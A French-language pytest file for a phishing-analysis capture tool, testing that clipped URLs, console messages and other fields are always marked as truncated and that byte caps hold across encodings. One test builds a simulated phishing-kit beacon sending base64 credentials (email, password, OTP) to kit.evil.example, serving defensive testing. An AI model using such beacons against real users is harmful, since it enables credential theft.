# SPDX-FileCopyrightText: 2026 GuatX
# SPDX-License-Identifier: AGPL-3.0-or-later
"""« Jamais de troncature muette » doit être vrai AU NIVEAU DE L'ENTRÉE.

`OcularResult.truncation` répond à « ce résultat est-il complet ? ». Il ne
désigne AUCUNE ligne. Une URL amputée était donc rendue à l'analyste avec
exactement l'apparence d'une URL entière — et sur une balise GET de kit de
phishing, ce qui disparaît est la fin de la query string, c'est-à-dire les
identifiants volés. Le modèle portait déjà ce motif (`post_data_truncated`) et
pour ce seul champ.

Deux propriétés verrouillées ici, et la première est structurelle :

  1. il n'existe qu'UN endroit où un champ d'entrée est coupé (`_clip_field`),
     et il pose le marqueur dans le même appel — donc « couper sans marquer »
     n'est pas un oubli possible, c'est un chemin qui n'existe pas ;
  2. les plafonds sont calibrés sur du contenu RÉEL, et un jeu d'entrées
     légitimes représentatives traverse la capture SANS être coupé.

Le jeu du tour précédent évitait la borne par construction (un JWT de ~1 Kio
sous un plafond de 4 096). Celui-ci est calqué sur des tailles MESURÉES.
"""
import base64
import json
import os

import pytest

from engine.result import ConsoleEntry, DomInfo, NetworkEntry
from engine.wrapper import (
    NetworkCapture,
    ResultBuilder,
    _clip_field,
    _clip_utf8,
    _max_console_text_bytes,
    _max_url_bytes,
)


class _Req:
    def __init__(self, url, post_data=None):
        self.url = url
        self.method = "GET"
        self.resource_type = "fetch"
        self.post_data = post_data


class _Msg:
    def __init__(self, text):
        self.type = "log"
        self.text = text


def _attach():
    hooks = {}

    class _Page:
        def on(self, event, fn):
            hooks[event] = fn

    cap = NetworkCapture()
    cap.attach(_Page())
    return cap, hooks


# --- 1. la propriété structurelle --------------------------------------------

def test_cutting_a_field_and_marking_it_are_the_same_call():
    entry = {"url": "https://e.test/" + "u" * 100_000}
    assert _clip_field(entry, "url", 4096) is True
    assert entry["truncated_fields"] == ["url"]
    assert len(entry["url"].encode("utf-8")) == 4096


def test_an_untouched_field_is_never_marked():
    entry = {"url": "https://e.test/court"}
    assert _clip_field(entry, "url", 4096) is False
    assert "truncated_fields" not in entry


def test_the_module_has_a_single_clipping_site():
    """Exhaustivité par construction : `_clip_utf8` est la primitive, mais le
    SEUL appelant autorisé est `_clip_field`, qui marque. Un second appelant
    rouvrirait la coupe muette sans qu'aucun test ne le voie."""
    import engine.wrapper as mod
    source = open(mod.__file__, encoding="utf-8").read()
    calls = source.count("_clip_utf8(")
    # 1 définition + 1 appel depuis `_clip_field`
    assert calls == 2, (
        f"{calls} occurrences de `_clip_utf8(` : la coupe doit passer par "
        f"`_clip_field`, qui est le seul endroit qui pose le marqueur"
    )


@pytest.mark.parametrize("field,cap_env,build_entry", [
    ("url", "OCULAR_MAX_URL_BYTES", lambda v: _Req(v)),
    ("post_data", "OCULAR_MAX_POST_DATA_BYTES", lambda v: _Req("https://e.test/", post_data=v)),
])
def test_every_clippable_network_field_names_itself(field, cap_env, build_entry, monkeypatch):
    monkeypatch.setenv(cap_env, "1024")
    cap, hooks = _attach()
    hooks["request"](build_entry("x" * 50_000))
    assert cap.network[0]["truncated_fields"] == [field]
    assert NetworkEntry(**cap.network[0]).truncated(field)


def test_console_text_names_itself(monkeypatch):
    monkeypatch.setenv("OCULAR_MAX_CONSOLE_TEXT_BYTES", "1024")
    cap, hooks = _attach()
    hooks["console"](_Msg("y" * 50_000))
    assert cap.console[0]["truncated_fields"] == ["text"]
    assert ConsoleEntry(**cap.console[0]).truncated("text")


def test_dom_title_and_final_url_name_themselves(monkeypatch):
    monkeypatch.setenv("OCULAR_MAX_TITLE_BYTES", "1024")
    result, _ = ResultBuilder().build(
        job_id="j", profile="capture", target="t", input_hash=None, verdict="unknown",
        dom_info=DomInfo(title="t" * 50_000, final_url="https://e.test/" + "f" * 50_000),
    )
    assert sorted(result.dom.truncated_fields) == ["final_url", "title"]


def test_headers_name_themselves(monkeypatch):
    monkeypatch.setenv("OCULAR_MAX_HEADERS_BYTES", "64")
    cap, hooks = _attach()
    req = _Req("https://e.test/")
    hooks["request"](req)
    cap.network[0]["headers"] = {f"h{i}": "v" * 40 for i in range(5)}
    from engine.wrapper import _clip_entry_text
    _clip_entry_text(cap.network[0], _max_url_bytes(), 64)
    assert "headers" in cap.network[0]["truncated_fields"]


# --- 2. l'alias historique reste servi, sans devenir une 2e source de vérité --

def test_the_legacy_boolean_is_derived_both_ways():
    neuf = NetworkEntry(url="u", method="GET", truncated_fields=["post_data"])
    assert neuf.post_data_truncated is True
    ancien = NetworkEntry(url="u", method="GET", post_data_truncated=True)
    assert ancien.truncated_fields == ["post_data"], (
        "un payload 1.0 déjà stocké doit se relire avec le marqueur par entrée"
    )
    vierge = NetworkEntry(url="u", method="GET")
    assert vierge.post_data_truncated is False and vierge.truncated_fields == []


# --- 3. l'unité annoncée est l'unité appliquée, POUR TOUT ENCODAGE -----------

@pytest.mark.parametrize("char", ["a", "é", "€", "𝄞", "\x00"])
@pytest.mark.parametrize("cap", [64, 1024, 8192])
def test_the_byte_cap_holds_whatever_the_encoding(char, cap):
    """Le chemin rapide affirmait « sous le cap en caractères, donc sous le cap
    en octets ». La prémisse (un caractère ≥ un octet) donne l'inverse : un
    caractère valant jusqu'à 4 octets, `len(text) <= cap` ne borne les octets
    qu'à `4 * cap`. Mesuré sur 2067ee7, aux plafonds PUBLIÉS : 8 000 « é »
    (16 000 octets) conservés ENTIERS pour un plafond de 8 192 — ×2,0 — et
    rendus avec `coupé = False`, donc non comptés."""
    for n in (1, cap // 2, cap - 1, cap, cap + 1, cap * 4):
        if n <= 0:
            continue
        text = char * n
        kept, cut = _clip_utf8(text, cap)
        kept_bytes = len(kept.encode("utf-8"))
        assert kept_bytes <= cap, (
            f"{n} caractères {char!r} : {kept_bytes} octets conservés pour un "
            f"plafond de {cap}"
        )
        assert cut == (kept_bytes < len(text.encode("utf-8"))), (
            "le marqueur de coupe doit dire exactement ce qui s'est passé"
        )


# --- 4. non-régression sur des entrées LÉGITIMES et représentatives ---------

def _saml_redirect() -> str:
    return ("https://sso.entreprise.example/idp/SSO?SAMLRequest="
            + base64.b64encode(os.urandom(4800)).decode() + "&RelayState=/app/home")


def _data_uri() -> str:
    return "data:image/png;base64," + base64.b64encode(os.urandom(12000)).decode()


def _oidc_token() -> str:
    claims = {"sub": "u1", "groups": [f"CN=grp-{i:04d},OU=Groupes,DC=corp,DC=example"
                                      for i in range(110)]}
    body = base64.urlsafe_b64encode(json.dumps(claims).encode()).decode()
    return "https://app.example/cb#id_token=eyJhbGciOiJSUzI1NiJ9." + body + ".sig"


def _stack_trace() -> str:
    return "TypeError: undefined is not a function\n" + "\n".join(
        f"    at Object../src/mod{i}.js (webpack:///./src/mod{i}.js?a1b2:{i * 7})"
        for i in range(120))


def _api_dump() -> str:
    return json.dumps({"items": [{"id": i, "label": f"produit numero {i}",
                                  "sku": f"SKU-{i:08d}", "prix": i * 1.5}
                                 for i in range(220)]})


LEGITIMES_URL = [
    ("redirect SAML (HTTP-Redirect binding)", _saml_redirect),
    ("URI data: d'une image inline", _data_uri),
    ("id_token OIDC chargé de groupes AD", _oidc_token),
    ("URL médiane du corpus réel", lambda: "https://cdn.example/assets/app.4f2c9a.js"),
]

LEGITIMES_CONSOLE = [
    ("trace de pile SPA webpack", _stack_trace),
    ("dump JSON d'une réponse d'API", _api_dump),
    ("erreur JS ordinaire", lambda: "Uncaught ReferenceError: x is not defined"),
]


@pytest.mark.parametrize("nom,make", LEGITIMES_URL)
def test_legitimate_urls_survive_intact(nom, make):
    """Mesuré sur 2067ee7 : 3 de ces 4 URL étaient coupées par le plafond de
    4 096 o. — sans aucun marqueur sur l'entrée."""
    url = make()
    cap, hooks = _attach()
    hooks["request"](_Req(url))
    assert cap.network[0]["url"] == url, f"{nom} coupée ({len(url.encode())} o.)"
    assert "truncated_fields" not in cap.network[0]


@pytest.mark.parametrize("nom,make", LEGITIMES_CONSOLE)
def test_legitimate_console_messages_survive_intact(nom, make):
    text = make()
    cap, hooks = _attach()
    hooks["console"](_Msg(text))
    assert cap.console[0]["text"] == text, f"{nom} coupé ({len(text.encode())} o.)"
    assert "truncated_fields" not in cap.console[0]


def test_a_phishing_beacon_keeps_its_whole_query_string():
    """Le cas d'usage central du produit : identifiants volés en base64 dans la
    query string d'une balise GET. Mesuré sur 2067ee7 : 8 532 octets émis,
    4 096 conservés, 4 436 perdus — mot de passe, OTP et adresse absents du
    résultat, et l'entrée rendue SANS marqueur."""
    vole = base64.b64encode(
        b"user=victime@corp.example&pass=Hiver2026!&otp=884213" * 80).decode()
    url = "https://kit.evil.example/g.gif?d=" + vole
    cap, hooks = _attach()
    hooks["request"](_Req(url))
    assert cap.network[0]["url"] == url
    for preuve in (b"pass=Hiver2026!", b"otp=884213", b"victime@corp.example"):
        assert preuve in base64.b64decode(cap.network[0]["url"].split("d=")[1])


def test_when_a_cap_does_bite_the_entry_says_so_and_the_ui_can_see_it():
    """La contrepartie : au-delà des plafonds, la coupe existe toujours — elle
    n'est simplement plus muette, ni au niveau du résultat, ni de l'entrée."""
    enorme = "https://e.test/?d=" + "z" * (_max_url_bytes() * 3)
    cap, hooks = _attach()
    hooks["request"](_Req(enorme))
    hooks["console"](_Msg("w" * (_max_console_text_bytes() * 3)))
    assert cap.network[0]["truncated_fields"] == ["url"]
    assert cap.console[0]["truncated_fields"] == ["text"]
    assert cap.truncation().text_truncated == 2
